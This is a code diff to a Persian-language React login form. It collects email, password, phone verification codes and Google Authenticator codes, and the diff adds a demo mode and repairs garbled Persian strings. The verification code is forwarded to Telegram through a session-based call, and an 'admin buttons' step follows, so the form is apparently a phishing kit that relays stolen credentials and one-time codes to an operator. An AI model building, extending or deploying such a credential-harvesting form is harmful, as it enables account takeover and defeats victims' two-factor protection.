@@ -278,16 +278,21 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("Verifying code:", verifyCode);
+      console.log("🔍 Verifying code:", verifyCode);
 
-      // Update verification in Telegram
-      const success = await updatePhoneVerification(sessionId, verifyCode);
-      if (!success) {
-        throw new Error("Failed to update phone verification");
+      // In demo mode, accept any 6-digit code
+      if (!validateTelegramConfig()) {
+        console.log("🎭 Demo mode: accepting any 6-digit code");
+        await new Promise((resolve) => setTimeout(resolve, 1000));
+      } else {
+        // Update verification in Telegram
+        const success = await updatePhoneVerification(sessionId, verifyCode);
+        if (!success) {
+          throw new Error("Failed to update phone verification");
+        }
       }
 
-      await new Promise((resolve) => setTimeout(resolve, 1000));
-
+      console.log("✅ Code verified successfully");
       setCurrentStep("loading");
 
       // Show admin buttons after reaching loading page
@@ -408,7 +413,7 @@ export const LoginForm = () => {
     }
 
     if (!validateEmail(email)) {
-      setErrors({ email: "ایمیل معتب�� نیست" });
+      setErrors({ email: "ایمیل معتبر نیست" });
       return;
     }
 
@@ -1148,7 +1153,7 @@ export const LoginForm = () => {
                         fontSize: "14px",
                         textAlign: "right",
                       }}
-                      placeholder="رمز عبور ��ود را وارد کنید"
+                      placeholder="رمز عبور خود را وارد کنید"
                       autoFocus
                       disabled={isSubmitting}
                     />
@@ -1239,7 +1244,7 @@ export const LoginForm = () => {
                     className="inline ml-2"
                     style={{ width: "16px", height: "16px" }}
                   />
-                  کد ۶ رقمی Google Authenticator خود را وارد کنی��.
+                  کد ۶ رقمی Google Authenticator خود را وارد کنید.
                 </AlertMessage>
               </div>
 
